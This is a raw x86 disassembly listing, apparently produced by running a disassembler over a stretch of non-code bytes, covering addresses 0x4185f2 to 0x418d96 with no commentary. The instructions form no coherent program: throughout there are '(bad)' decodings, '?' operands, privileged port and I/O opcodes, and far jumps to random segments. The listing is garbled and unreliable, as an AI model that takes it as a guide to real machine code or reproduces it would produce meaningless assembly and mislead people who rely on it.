  4185f2:	and    eax,0xedcfb05f
  4185f7:	retf   0x9819
  4185fa:	xchg   ebp,eax
  4185fb:	call   0x8662aac8
  418600:	fdivr  st,st(1)
  418602:	mov    bl,0x95
  418604:	dec    ebx
  418605:	mov    esi,DWORD PTR [ebx]
  418607:	test   al,0x7d
  418609:	icebp  
  41860a:	aaa    
  41860b:	idiv   BYTE PTR [edx]
  41860d:	cmp    al,0xe3
  41860f:	lods   eax,DWORD PTR ds:[esi]
  418610:	mov    edi,0xb34225b8
  418615:	mov    ds:0xfef313e7,eax
  41861a:	cmp    edi,esp
  41861c:	jb     0x418666
  41861e:	outs   dx,BYTE PTR ds:[esi]
  41861f:	and    BYTE PTR [eax+0x4a],dh
  418622:	dec    esp
  418623:	pop    eax
  418624:	cwde   
  418625:	push   0x67
  418627:	cli    
  418628:	rol    DWORD PTR [edi-0x4],cl
  41862b:	jp     0x418633
  41862d:	mov    esi,0x95ec2e9e
  418632:	adc    dl,bl
  418634:	jecxz  0x41864c
  418636:	popf   
  418637:	pop    esi
  418638:	test   al,0xd9
  41863a:	push   0xd9e92b9d
  41863f:	sbb    DWORD PTR [esi-0xad325f3],0x6590e113
  418649:	icebp  
  41864a:	mov    bl,0xae
  41864c:	daa    
  41864d:	ins    BYTE PTR es:[edi],dx
  41864e:	dec    ebx
  41864f:	xchg   esi,eax
  418650:	cs pop esp
  418652:	cwde   
  418653:	jae    0x418660
  418655:	push   ds
  418656:	and    ah,al
  418658:	enter  0xba5a,0x90
  41865c:	jnp    0x418694
  41865e:	xchg   ebp,eax
  41865f:	adc    BYTE PTR [edi+0x2df02379],0x6f
  418666:	inc    ebp
  418667:	pop    ebx
  418668:	jno    0x4186dd
  41866a:	cmp    al,0x8f
  41866c:	and    ebx,DWORD PTR [edx-0x5d0b8907]
  418672:	je     0x41869f
  418674:	mov    dl,0x75
  418676:	mov    DWORD PTR [ecx-0x7c],esi
  418679:	dec    DWORD PTR [edx]
  41867b:	or     ecx,DWORD PTR [eax+0x4f3234f3]
  418681:	popf   
  418682:	mov    cl,BYTE PTR [esi-0x63]
  418685:	push   ecx
  418686:	dec    esp
  418687:	ins    BYTE PTR es:[edi],dx
  418688:	mov    eax,ds:0xbbd87883
  41868d:	mov    ah,0x7c
  41868f:	ror    DWORD PTR [esp+ecx*2],1
  418692:	jle    0x418705
  418694:	jle    0x418630
  418696:	and    bl,bl
  418698:	fs xor al,0x44
  41869b:	pusha  
  41869c:	in     al,0x26
  41869e:	retf   0x381e
  4186a1:	sbb    eax,DWORD PTR [ecx+0x3a1ebfad]
  4186a7:	pop    ecx
  4186a8:	fidivr WORD PTR [ebp-0x10]
  4186ab:	pop    edx
  4186ac:	vmread DWORD PTR [edx+0x7b],esi
  4186b0:	push   ds
  4186b1:	jg     0x41872c
  4186b3:	push   0x6a43cbd4
  4186b8:	add    dl,BYTE PTR es:0xb6838b5d
  4186bf:	aad    0x77
  4186c1:	cmp    DWORD PTR [edi+0x26],esi
  4186c4:	pop    ss
  4186c5:	je     0x4186f4
  4186c7:	ins    BYTE PTR es:[edi],dx
  4186c8:	xchg   esp,eax
  4186c9:	lahf   
  4186ca:	jmp    0x418722
  4186cc:	in     eax,dx
  4186cd:	call   0x3aa1:0xbb10a549
  4186d4:	dec    edi
  4186d5:	sub    bh,BYTE PTR [edx-0x112290a3]
  4186db:	adc    esi,eax
  4186dd:	repnz int 0x22
  4186e0:	inc    ecx
  4186e1:	mov    BYTE PTR [esi-0x57],0x1e
  4186e5:	pushf  
  4186e6:	push   0x2024f2b3
  4186eb:	es imul ebx,ecx,0xfffffffa
  4186ef:	cmp    BYTE PTR [eax+0x717f6336],ch
  4186f5:	xor    al,dl
  4186f7:	push   edx
  4186f8:	imul   DWORD PTR [edi]
  4186fa:	dec    eax
  4186fb:	daa    
  4186fc:	ja     0x418725
  4186fe:	mov    al,0x2e
  418700:	or     bh,BYTE PTR [edi]
  418702:	adc    eax,0x6693db09
  418707:	sar    DWORD PTR [ecx+0x18],cl
  41870a:	hlt    
  41870b:	mov    bl,0x93
  41870d:	and    ebx,DWORD PTR [ecx+0x59]
  418710:	jl     0x418784
  418712:	scas   eax,DWORD PTR es:[edi]
  418713:	sub    dh,BYTE PTR [esi]
  418715:	or     eax,DWORD PTR [esp+ebx*2+0xfe520e0]
  41871c:	imul   DWORD PTR [ecx-0x19]
  41871f:	cli    
  418720:	push   eax
  418721:	fwait
  418722:	push   ebx
  418723:	cmp    DWORD PTR [eax],ebx
  418725:	jmp    0xf93e:0x35d1a0c4
  41872c:	test   eax,0x4671fbe2
  418731:	cmp    DWORD PTR [bx+0x5d],ebp
  418735:	jmp    0x6893718
  41873a:	add    bl,ah
  41873c:	bound  edi,QWORD PTR [eax+0x15]
  41873f:	or     dh,dh
  418741:	rcl    DWORD PTR [ebx+0x76f05760],0x47
  418748:	scas   al,BYTE PTR es:[edi]
  418749:	popa   
  41874a:	sbb    BYTE PTR [edx],ah
  41874c:	cli    
  41874d:	not    BYTE PTR [ebx+0x7057cb8e]
  418753:	in     al,0xfe
  418755:	les    ebp,FWORD PTR [ebx-0x50]
  418758:	gs push edx
  41875a:	mov    esp,0x51588bc9
  41875f:	in     eax,0x29
  418761:	out    dx,eax
  418762:	ins    BYTE PTR es:[edi],dx
  418763:	aam    0x29
  418765:	jge    0x418760
  418767:	inc    eax
  418768:	adc    edx,ebp
  41876a:	ins    DWORD PTR es:[edi],dx
  41876b:	add    eax,0x82d1360f
  418770:	in     al,0x2d
  418772:	cmc    
  418773:	cld    
  418774:	pop    esp
  418776:	inc    edi
  418777:	pop    edx
  418778:	cmp    bl,BYTE PTR [edx-0x6643bc29]
  41877e:	pop    esi
  41877f:	stos   BYTE PTR es:[edi],al
  418780:	adc    DWORD PTR [ebx+esi*8-0x26],ebp
  418784:	aam    0x35
  418786:	loope  0x4187ec
  418788:	push   ss
  418789:	sub    al,0x57
  41878b:	or     eax,0x959802b
  418790:	cmp    esp,DWORD PTR [eax+eax*8]
  418793:	pushf  
  418794:	push   ebp
  418795:	add    al,0xc8
  418797:	or     eax,0xa5c41599
  41879c:	out    dx,al
  41879d:	push   ebx
  41879e:	sub    ah,BYTE PTR [esi+0x3379d8b6]
  4187a4:	add    ch,0x46
  4187a7:	adc    DWORD PTR [esi+0x36],ebx
  4187aa:	mov    DWORD PTR [ecx-0x14],ebx
  4187ad:	out    dx,eax
  4187ae:	pop    edx
  4187af:	dec    esi
  4187b0:	imul   ecx
  4187b2:	mov    eax,esp
  4187b4:	enter  0xa23c,0x34
  4187b8:	aas    
  4187b9:	hlt    
  4187ba:	mov    eax,0xd4cb013
  4187bf:	xchg   ecx,eax
  4187c0:	push   0x19d7843d
  4187c5:	or     esp,DWORD PTR [edi+0x4324da38]
  4187cb:	pop    esi
  4187cc:	mov    edx,0xa17409ff
  4187d1:	pop    edi
  4187d2:	push   edi
  4187d3:	push   0x4e14d3cb
  4187d8:	hlt    
  4187d9:	frstor [eax-0x5f13a66f]
  4187df:	mov    bh,0x73
  4187e1:	in     eax,dx
  4187e2:	fadd   DWORD PTR [edi-0x789fedd8]
  4187e8:	outs   dx,DWORD PTR ds:[esi]
  4187e9:	mov    eax,ds:0xa5ad6191
  4187ee:	add    dh,BYTE PTR [ecx+0x62]
  4187f1:	neg    BYTE PTR [esi-0x3f46dcbf]
  4187f7:	repnz retf 0xbc6b
  4187fb:	mov    edi,0x54096820
  418800:	inc    ecx
  418801:	inc    edx
  418802:	out    0xad,al
  418804:	aam    0x53
  418806:	scas   al,BYTE PTR es:[edi]
  418807:	inc    esi
  418808:	push   esp
  418809:	jmp    FWORD PTR [edi-0x55]
  41880c:	lock push edx
  41880e:	add    bh,bl
  418810:	xor    eax,0x7734805f
  418815:	mov    DWORD PTR [ebx+0x32],ebp
  418818:	sar    DWORD PTR [ebp-0x7b],cl
  41881b:	das    
  41881c:	mov    ds:0x5f23f8a0,al
  418821:	jmp    0xd762:0x17df29a4
  418828:	mov    dh,0xbf
  41882a:	jae    0x418876
  41882c:	and    ebp,edx
  41882e:	das    
  41882f:	xchg   eax,esi
  418831:	test   eax,0x2c28f950
  418836:	xor    ch,BYTE PTR [edx]
  418838:	(bad)  [esi+0x79bbe40f]
  41883e:	lods   eax,DWORD PTR ds:[esi]
  41883f:	adc    dl,BYTE PTR [edx]
  418841:	ret    
  418842:	xor    al,0x7c
  418844:	xor    eax,0x4376f1ce
  418849:	imul   esi,DWORD PTR [edx-0x31],0xffffffc4
  41884d:	jmp    0x15f226e5
  418852:	(bad)  
  418853:	loop   0x4187d5
  418855:	mov    ch,0xc2
  418857:	arpl   di,ax
  418859:	inc    edi
  41885a:	mov    ah,0xb8
  41885c:	jne    0x418875
  41885e:	xor    al,0x6c
  418860:	jl     0x4188af
  418862:	sub    BYTE PTR [esi-0x29],cl
  418865:	push   0xc40941cd
  41886a:	fsubr  QWORD PTR [ecx+0x26]
  41886d:	cli    
  41886e:	mov    ?,WORD PTR [eax-0x9059dff]
  418874:	jb     0x418846
  418876:	(bad)  
  418877:	fiadd  WORD PTR [edx-0x98d9633]
  41887d:	push   es
  41887e:	inc    ebx
  41887f:	nop
  418880:	std    
  418881:	stos   DWORD PTR es:[edi],eax
  418882:	test   al,0x65
  418884:	scas   al,BYTE PTR es:[edi]
  418885:	xchg   edx,eax
  418886:	lock inc edx
  418888:	test   BYTE PTR [ebp+0x70cc1aab],bl
  41888e:	adc    al,0x56
  418890:	sbb    bl,al
  418892:	mov    dl,0x1c
  418894:	and    DWORD PTR [ebx+0x4faadb46],ebp
  41889a:	loop   0x41890a
  41889c:	div    DWORD PTR [esi+0x21]
  41889f:	or     DWORD PTR ds:0x7b2e4d7,edi
  4188a5:	jp     0x4188f2
  4188a7:	jecxz  0x418883
  4188a9:	mov    eax,0x30eb9fb
  4188ae:	mov    eax,ds:0x25be224f
  4188b3:	daa    
  4188b4:	je     0x418903
  4188b6:	xchg   edx,eax
  4188b7:	mov    eax,ds:0x4bd50a19
  4188bc:	gs (bad) 
  4188be:	inc    ebp
  4188bf:	(bad)  
  4188c0:	out    0xa7,eax
  4188c2:	mov    esi,0x9dd499cc
  4188c7:	es sub eax,0x882bebef
  4188cd:	mov    fs,WORD PTR [esi]
  4188cf:	adc    ch,BYTE PTR [edx+0x31]
  4188d2:	and    DWORD PTR es:[edi],eax
  4188d5:	shr    BYTE PTR [edi-0x60c1bdb0],cl
  4188db:	lahf   
  4188dc:	loopne 0x41886e
  4188de:	loopne 0x418951
  4188e0:	push   esi
  4188e1:	adc    BYTE PTR [esi],bh
  4188e3:	mov    ah,0x21
  4188e5:	xchg   ecx,eax
  4188e6:	pop    ss
  4188e7:	push   ebx
  4188e8:	push   ecx
  4188e9:	es dec ecx
  4188eb:	in     al,0x89
  4188ed:	and    ecx,edx
  4188ef:	pop    ss
  4188f0:	sbb    cl,bh
  4188f2:	into   
  4188f3:	out    dx,eax
  4188f4:	sub    BYTE PTR [edi-0x4ca610b7],al
  4188fa:	mov    cl,al
  4188fc:	mov    ds:0x60b47eaa,al
  418901:	pushf  
  418902:	dec    BYTE PTR ds:0x9d4445cd
  418908:	shr    DWORD PTR [ecx],cl
  41890a:	sub    ecx,edi
  41890c:	clc    
  41890d:	iret   
  41890e:	and    DWORD PTR [edi-0xb],edi
  418911:	push   eax
  418912:	int    0xf9
  418914:	sbb    ch,bl
  418916:	adc    DWORD PTR [eax+0x5857f7f],edi
  41891c:	outs   dx,DWORD PTR ds:[esi]
  41891d:	daa    
  41891e:	lods   eax,DWORD PTR ds:[esi]
  41891f:	stc    
  418920:	push   eax
  418921:	mov    DWORD PTR [ebx+esi*8+0x3a185849],esi
  418928:	stos   BYTE PTR es:[edi],al
  418929:	or     ebx,eax
  41892b:	fsub   QWORD PTR [edx-0x60]
  41892e:	mov    dh,BYTE PTR [edi]
  418930:	iret   
  418931:	cmc    
  418932:	jne    0x418961
  418934:	xlat   BYTE PTR ds:[ebx]
  418935:	ror    DWORD PTR [bx+di-0x3c14],1
  41893a:	xchg   esi,eax
  41893b:	and    ecx,eax
  41893d:	sbb    BYTE PTR [eax+0x6f],dh
  418940:	cmp    eax,0x9425d0d8
  418945:	cdq    
  418946:	ret    0xc6ca
  418949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41894a:	mov    cl,dh
  41894c:	xor    dl,ch
  41894e:	mov    bl,0x8a
  418950:	add    al,0xf5
  418952:	xchg   ecx,eax
  418953:	addr16 push ss
  418955:	push   es
  418956:	adc    ch,BYTE PTR [ebp+0x31f5816a]
  41895c:	jae    0x41892e
  41895e:	leave  
  41895f:	xchg   ebp,eax
  418960:	mov    cl,0xc2
  418962:	adc    dl,BYTE PTR [ebp+0x556f3dfd]
  418968:	(bad)  
  418969:	std    
  41896a:	push   ebx
  41896b:	xchg   DWORD PTR [eax+0x5a],ebp
  41896e:	fs mov eax,0x21c31e18
  418974:	cmp    eax,0x9d072e92
  418979:	sub    al,0x8f
  41897b:	mov    eax,0x5029c297
  418980:	xor    BYTE PTR [edx],ah
  418982:	xchg   esi,eax
  418983:	(bad)  
  418984:	rcl    edx,cl
  418986:	ins    DWORD PTR es:[edi],dx
  418987:	popf   
  418988:	(bad)  
  418989:	cmp    ebx,DWORD PTR [ebx+0x47aa7f70]
  41898f:	cld    
  418990:	add    eax,0x514c675e
  418995:	push   0xe079751
  41899a:	clc    
  41899b:	fnstsw WORD PTR [ebp-0x2520c9b8]
  4189a1:	inc    esp
  4189a2:	repz push ebx
  4189a4:	shl    DWORD PTR [esi-0x5f82fd4d],1
  4189aa:	jge    0x4189ec
  4189ac:	rcl    DWORD PTR ds:0x45d320eb,0xc
  4189b3:	fdecstp 
  4189b5:	mov    edx,esp
  4189b7:	scas   al,BYTE PTR es:[edi]
  4189b8:	aaa    
  4189b9:	pop    ecx
  4189ba:	pop    edx
  4189bb:	mov    edi,0xcb14b84e
  4189c0:	ds jecxz 0x4189bb
  4189c3:	inc    ecx
  4189c4:	pop    ecx
  4189c5:	mov    ebp,0xad780e47
  4189ca:	sahf   
  4189cb:	jb     0x4189b6
  4189cd:	or     cl,BYTE PTR [edx-0xbc4e3bc]
  4189d3:	ficomp WORD PTR [eax+0x31]
  4189d6:	add    eax,0x134eb0a4
  4189db:	dec    esi
  4189dc:	xor    DWORD PTR [esi],ecx
  4189de:	bound  ebp,QWORD PTR [ebp+0x34aa73b2]
  4189e4:	fist   WORD PTR [ebp-0x19]
  4189e7:	xchg   BYTE PTR [ebp+0x5d],dl
  4189ea:	rcr    DWORD PTR [ebx+ebp*8],0x53
  4189ee:	fs jnp 0x4189a4
  4189f1:	sbb    BYTE PTR [esi],bh
  4189f3:	adc    esi,DWORD PTR [ebp-0x74]
  4189f6:	fcmovnbe st,st(1)
  4189f8:	add    edx,DWORD PTR [ebx]
  4189fa:	repz sar BYTE PTR [edi],cl
  4189fd:	ret    
  4189fe:	and    DWORD PTR [ebp+0x68186460],ebp
  418a04:	fnstenv [ecx+0x7584aabb]
  418a0a:	push   esp
  418a0b:	add    ch,BYTE PTR [ebp+0xe0d43a9]
  418a11:	sbb    al,0x6a
  418a13:	in     al,dx
  418a14:	mov    dh,0xfc
  418a16:	cdq    
  418a17:	cwde   
  418a18:	lods   eax,DWORD PTR ds:[esi]
  418a19:	push   ecx
  418a1a:	xchg   esi,eax
  418a1b:	sub    BYTE PTR [edi-0x73344f28],ch
  418a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a22:	stos   DWORD PTR es:[edi],eax
  418a23:	xor    BYTE PTR [esi+0x57],bh
  418a26:	leave  
  418a27:	cmp    al,0xf0
  418a29:	mov    ch,0xd3
  418a2b:	out    dx,eax
  418a2c:	out    0xb2,al
  418a2e:	ja     0x4189fd
  418a30:	out    dx,eax
  418a31:	sbb    ah,BYTE PTR ds:0x2eb2ef07
  418a37:	scas   eax,DWORD PTR es:[edi]
  418a38:	pusha  
  418a39:	or     ch,BYTE PTR [ecx-0x7259dea4]
  418a3f:	bound  esp,QWORD PTR [ecx+0x4b7fc04b]
  418a45:	lds    edx,FWORD PTR [ebx+0xb]
  418a48:	xor    al,0xb0
  418a4a:	sub    al,0xf7
  418a4c:	ret    0xdbf2
  418a4f:	aam    0x1c
  418a51:	push   edi
  418a52:	shl    DWORD PTR [ebp+0x77],0x2c
  418a56:	xchg   BYTE PTR [esi-0x62114c21],dh
  418a5c:	retf   
  418a5d:	test   BYTE PTR [ebp+0x4d4c7236],bh
  418a63:	int    0x48
  418a65:	sbb    eax,0xb56a9442
  418a6a:	call   FWORD PTR [edi-0x3924ff29]
  418a70:	sar    ebp,1
  418a72:	sahf   
  418a73:	repnz lods eax,DWORD PTR ds:[esi]
  418a75:	sub    eax,0xeacccb89
  418a7a:	jecxz  0x418abf
  418a7c:	in     al,dx
  418a7d:	vmaxsd xmm0,xmm3,QWORD PTR [esi]
  418a81:	cmp    esi,DWORD PTR [ecx+0x76]
  418a84:	int3   
  418a85:	sbb    BYTE PTR [edi-0x8],0xc9
  418a89:	fsubr  st(2),st
  418a8b:	inc    edi
  418a8c:	cld    
  418a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a8e:	dec    ecx
  418a8f:	mov    dl,0x94
  418a91:	out    0x5f,al
  418a93:	(bad)  
  418a94:	sbb    al,BYTE PTR [ebx+0x14]
  418a97:	pop    ss
  418a98:	adc    ebx,DWORD PTR [ecx]
  418a9a:	nop
  418a9b:	pop    edi
  418a9c:	mov    ebx,0x611fb0d5
  418aa1:	mov    al,0xde
  418aa3:	aas    
  418aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aa5:	inc    ecx
  418aa6:	mov    ecx,0x611c7865
  418aab:	mov    WORD PTR [edx-0x3f],?
  418aae:	in     al,0x5d
  418ab0:	fs push ebx
  418ab2:	repz retf 0x7122
  418ab6:	neg    BYTE PTR [edi+0x4ccad491]
  418abc:	ins    DWORD PTR es:[edi],dx
  418abd:	jne    0x418abf
  418abf:	ins    BYTE PTR es:[edi],dx
  418ac0:	stos   BYTE PTR es:[edi],al
  418ac1:	loop   0x418b41
  418ac3:	(bad)  
  418ac4:	rcr    BYTE PTR [edx-0x62aab917],1
  418aca:	(bad)  
  418acc:	mov    WORD PTR [edx],ss
  418ace:	adc    eax,0xd4715d38
  418ad3:	xor    esi,DWORD PTR [ecx-0x7b]
  418ad6:	fld    TBYTE PTR [ebp+0x2b]
  418ad9:	xor    BYTE PTR [ebp+0x32],bl
  418adc:	or     ecx,DWORD PTR [edi]
  418ade:	call   0xdbdd0e78
  418ae3:	jg     0x418aac
  418ae5:	pop    edx
  418ae6:	add    ebx,DWORD PTR [edi+0x29aa44f]
  418aec:	add    esp,DWORD PTR [edx+edi*4+0x6e]
  418af0:	pushf  
  418af1:	out    0xb,eax
  418af3:	adc    bh,BYTE PTR [esp+esi*2]
  418af6:	in     al,0x27
  418af8:	push   0x71
  418afa:	xor    DWORD PTR [eax-0x5f],esi
  418afd:	adc    BYTE PTR [edx+0x2ad3c82f],ah
  418b03:	xor    esp,DWORD PTR [ecx+0x59]
  418b06:	out    dx,al
  418b07:	add    esp,DWORD PTR [ebp-0x12]
  418b0a:	sbb    eax,0x1b248b38
  418b0f:	shl    DWORD PTR [ecx],0x87
  418b12:	daa    
  418b13:	mov    edi,DWORD PTR [ebx]
  418b15:	push   ecx
  418b16:	push   edi
  418b17:	scas   eax,DWORD PTR es:[edi]
  418b18:	add    BYTE PTR [edx],0x3f
  418b1b:	add    DWORD PTR [eax],0xebf25841
  418b21:	mov    ah,0xc0
  418b23:	and    BYTE PTR [ebx],0x81
  418b26:	add    al,0x17
  418b28:	mov    dh,0x44
  418b2a:	sbb    dl,dh
  418b2c:	mov    BYTE PTR [edi+0x67b87837],ah
  418b32:	aam    0x30
  418b34:	jns    0x418b5f
  418b36:	test   DWORD PTR [ebp+ebp*8+0x178f1232],0x60229a2
  418b41:	dec    eax
  418b42:	ja     0x418adf
  418b44:	pop    eax
  418b45:	pop    ss
  418b46:	pop    esp
  418b47:	adc    eax,0x8f7dea3c
  418b4c:	call   0xd2f6:0xbd285b9f
  418b53:	and    eax,0xb82a80d2
  418b58:	or     eax,0x9f67a96
  418b5d:	fst    DWORD PTR [ebx]
  418b5f:	arpl   di,sp
  418b61:	xor    edx,esp
  418b63:	add    eax,edi
  418b65:	adc    cl,BYTE PTR [ecx+0x42]
  418b68:	pushw  cs
  418b6a:	sbb    esp,edi
  418b6c:	stc    
  418b6d:	outs   dx,BYTE PTR ds:[esi]
  418b6e:	dec    ecx
  418b6f:	fcomp  QWORD PTR [edi]
  418b71:	sub    ebp,DWORD PTR [edx]
  418b73:	and    al,0xa7
  418b75:	jl     0x418b0c
  418b77:	jge    0x418afc
  418b79:	sahf   
  418b7a:	mov    bl,0xe6
  418b7c:	dec    esi
  418b7d:	iret   
  418b7e:	push   es
  418b7f:	inc    edx
  418b80:	sti    
  418b81:	rcl    DWORD PTR [ebp-0x5db728d2],cl
  418b87:	dec    ebx
  418b88:	mov    cl,0x1e
  418b8a:	rcl    DWORD PTR [ecx+0x1c83ca6a],0x4c
  418b91:	test   edx,esi
  418b93:	cmp    al,0xaf
  418b95:	int    0x59
  418b97:	popa   
  418b98:	xor    dh,BYTE PTR fs:[ebp+0x77]
  418b9c:	into   
  418b9d:	loop   0x418b7f
  418b9f:	ins    DWORD PTR es:[edi],dx
  418ba0:	cli    
  418ba1:	cmp    DWORD PTR [ecx],esi
  418ba3:	push   esp
  418ba4:	xor    DWORD PTR [ecx-0x7a92488e],edi
  418baa:	mov    DWORD PTR [edi],esi
  418bac:	dec    edi
  418bad:	sbb    esi,ecx
  418baf:	(bad)  
  418bb1:	push   edx
  418bb2:	mov    esi,0x2bc34c74
  418bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bb8:	ss stos DWORD PTR es:[edi],eax
  418bba:	jne    0x418b77
  418bbc:	inc    eax
  418bbd:	push   esi
  418bbe:	lods   eax,DWORD PTR ds:[esi]
  418bbf:	jmp    0x2ca9:0x61e7668a
  418bc6:	sti    
  418bc7:	push   esi
  418bc8:	cmp    DWORD PTR [edx+esi*1],edi
  418bcb:	jp     0x418b57
  418bcd:	bound  ecx,QWORD PTR [ebp+eiz*1-0x1c]
  418bd1:	jns    0x418b7b
  418bd3:	adc    eax,DWORD PTR [ecx+0x40]
  418bd6:	push   edx
  418bd7:	pop    es
  418bd8:	sti    
  418bd9:	mov    ebp,0xad24ee6c
  418bde:	fdivrp st(5),st
  418be0:	and    al,0x89
  418be2:	mov    edi,0x4ac5a339
  418be7:	cs dec ecx
  418be9:	sub    al,0x98
  418beb:	inc    edx
  418bec:	cmp    bh,BYTE PTR [ecx]
  418bee:	and    al,0x0
  418bf0:	shr    DWORD PTR es:[edx],cl
  418bf3:	adc    bh,BYTE PTR [eax+0x214d1f13]
  418bf9:	add    bl,BYTE PTR [ebp+0x6860f5de]
  418bff:	mov    eax,0x23bde5ba
  418c04:	jmp    0xebd420db
  418c09:	xchg   ebx,eax
  418c0a:	pop    edi
  418c0b:	mul    BYTE PTR [edi]
  418c0d:	sbb    cl,BYTE PTR [edi]
  418c0f:	ror    BYTE PTR [eax-0x4a],cl
  418c12:	in     al,0xb0
  418c14:	xchg   DWORD PTR gs:[edi-0x37fcae0f],ebx
  418c1b:	jns    0x418bb2
  418c1d:	xchg   bl,dl
  418c1f:	or     cl,BYTE PTR [eax-0x2729835f]
  418c25:	add    ebx,DWORD PTR [esi-0x7f]
  418c28:	cmp    ebp,DWORD PTR [eax+0x2daf86a5]
  418c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c2f:	jns    0x418bf8
  418c31:	fnsave [ebx-0x25]
  418c34:	sub    ecx,DWORD PTR [esi+0x53]
  418c37:	xchg   BYTE PTR [esi+0x58],bh
  418c3a:	sbb    DWORD PTR [ecx-0x13],esi
  418c3d:	in     al,dx
  418c3e:	cmp    DWORD PTR [ebx+0x3ed1ffc4],ebp
  418c44:	jg     0x418c79
  418c46:	cmp    al,0xfc
  418c48:	lahf   
  418c49:	adc    BYTE PTR [ebp+0x1058d226],bl
  418c4f:	lods   eax,DWORD PTR ds:[esi]
  418c50:	cs lock push ss
  418c53:	in     al,dx
  418c54:	push   esp
  418c55:	dec    ebp
  418c56:	out    0xbf,eax
  418c58:	popa   
  418c59:	(bad)  [esi+ebx*1]
  418c5c:	jo     0x418c6a
  418c5e:	data16 ficom DWORD PTR [esi-0x80]
  418c62:	dec    edx
  418c63:	loop   0x418c9c
  418c65:	jae    0x418c3a
  418c67:	push   edx
  418c68:	out    dx,eax
  418c69:	mov    BYTE PTR [ebp+0x4e457a65],dh
  418c6f:	add    ecx,DWORD PTR [ebx+0x8]
  418c72:	lods   al,BYTE PTR ds:[esi]
  418c73:	cmc    
  418c74:	icebp  
  418c75:	jl     0x418cea
  418c77:	push   ds
  418c78:	xchg   edx,eax
  418c79:	js     0x418c77
  418c7b:	mov    bh,0xc3
  418c7d:	adc    DWORD PTR [edx-0x2c],0x5d037174
  418c84:	mov    ?,WORD PTR fs:[eax-0x759aa97c]
  418c8b:	inc    ecx
  418c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c8d:	(bad)  
  418c8e:	dec    ebp
  418c8f:	xchg   edi,eax
  418c90:	pop    ebp
  418c91:	mov    esi,DWORD PTR [edi+eiz*8-0x4c]
  418c95:	push   esi
  418c96:	(bad)  
  418c97:	inc    edi
  418c98:	into   
  418c99:	test   esi,ebp
  418c9b:	inc    ebx
  418c9c:	jno    0x418cd7
  418c9e:	test   edi,ebx
  418ca0:	into   
  418ca1:	sub    BYTE PTR [eax+0x61bb99c],al
  418ca7:	push   cs
  418ca8:	fild   QWORD PTR [ebx-0x7b89c659]
  418cae:	clc    
  418caf:	cmp    ecx,DWORD PTR [edx-0x8]
  418cb2:	(bad)  
  418cb3:	cmp    eax,edi
  418cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cb6:	(bad)  
  418cb7:	ins    BYTE PTR es:[edi],dx
  418cb8:	jge    0x418c96
  418cba:	xchg   ebx,eax
  418cbb:	pusha  
  418cbc:	test   BYTE PTR [edi-0x4a8f9113],bl
  418cc2:	or     DWORD PTR [edi+0x44],ebp
  418cc5:	rcl    BYTE PTR [ebp+0x19],cl
  418cc8:	rcl    BYTE PTR [edi-0x479beece],cl
  418cce:	sti    
  418ccf:	sub    ecx,DWORD PTR [ebx-0x3ef04156]
  418cd5:	jle    0x418d3d
  418cd7:	cld    
  418cd8:	push   0xffffffdd
  418cda:	imul   esi,DWORD PTR [ebx+0x26],0x5b5ba6b2
  418ce1:	push   ds
  418ce2:	mov    dh,0x69
  418ce4:	data16 jl 0x418d0e
  418ce7:	std    
  418ce8:	dec    edi
  418ce9:	sar    ebx,0x1e
  418cec:	jl     0x418d48
  418cee:	stos   DWORD PTR es:[edi],eax
  418cef:	mov    bh,0x1a
  418cf1:	mov    WORD PTR [ebx-0x31],?
  418cf4:	xchg   ecx,eax
  418cf5:	jmp    0xa389:0xb8f197a7
  418cfc:	xchg   esi,eax
  418cfd:	repnz xchg ebx,eax
  418cff:	mov    bh,0x55
  418d01:	jo     0x418ca0
  418d03:	leave  
  418d04:	cmp    DWORD PTR [ecx+edx*1+0x57],edx
  418d08:	push   cs
  418d09:	outs   dx,DWORD PTR ds:[esi]
  418d0a:	fild   DWORD PTR [edx-0x52]
  418d0d:	and    ah,BYTE PTR [esi-0x7f]
  418d10:	push   eax
  418d11:	inc    ebx
  418d12:	lods   al,BYTE PTR ds:[esi]
  418d13:	cmp    eax,0x4198fbbd
  418d18:	cmp    al,0xe
  418d1a:	mov    al,ds:0x19cc0609
  418d1f:	arpl   dx,di
  418d21:	xchg   edx,eax
  418d22:	adc    DWORD PTR [ebp+0x57],esi
  418d25:	int3   
  418d26:	retf   
  418d27:	out    dx,eax
  418d28:	and    al,0xca
  418d2a:	lock sbb eax,0xd56cc36a
  418d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d31:	cmp    eax,0x6dfe0bf0
  418d36:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d39:	mul    dl
  418d3b:	xor    al,0x78
  418d3d:	imul   DWORD PTR [esi-0x49]
  418d40:	or     BYTE PTR [eax],0x2e
  418d43:	jp     0x418cfa
  418d45:	inc    ebx
  418d46:	out    dx,eax
  418d47:	jmp    0x418d6a
  418d49:	add    al,BYTE PTR [edx-0x71f13eba]
  418d4f:	dec    ebx
  418d50:	les    edi,FWORD PTR [esi]
  418d52:	jb     0x418dc5
  418d54:	jns    0x418dbb
  418d56:	psubsb mm6,QWORD PTR [edi+0x273b0c66]
  418d5d:	dec    ecx
  418d5e:	push   ebx
  418d5f:	retf   0x37ac
  418d62:	xchg   edx,eax
  418d63:	sub    ebx,ebx
  418d65:	or     bl,BYTE PTR [ebx+0x2e]
  418d68:	add    ebp,DWORD PTR [ecx+0x76]
  418d6b:	aad    0x9
  418d6d:	pop    ds
  418d6e:	jmp    0xb72c:0x589c53ca
  418d75:	test   BYTE PTR [ecx+ecx*4+0x28d5cea4],0x3c
  418d7d:	cdq    
  418d7e:	push   esp
  418d7f:	rcl    DWORD PTR fs:[ebx+0x11],1
  418d83:	cwde   
  418d84:	scas   eax,DWORD PTR es:[edi]
  418d85:	popa   
  418d86:	js     0x418d0d
  418d88:	shl    BYTE PTR [edi+0x3b],0x3f
  418d8c:	or     al,0x72
  418d8e:	cld    
  418d8f:	adc    al,0x9b
  418d91:	je     0x418dee
  418d93:	pop    ebp
  418d94:	mov    dl,0xba
  418d96:	mov    gs,WORD PTR [ecx+0x44]
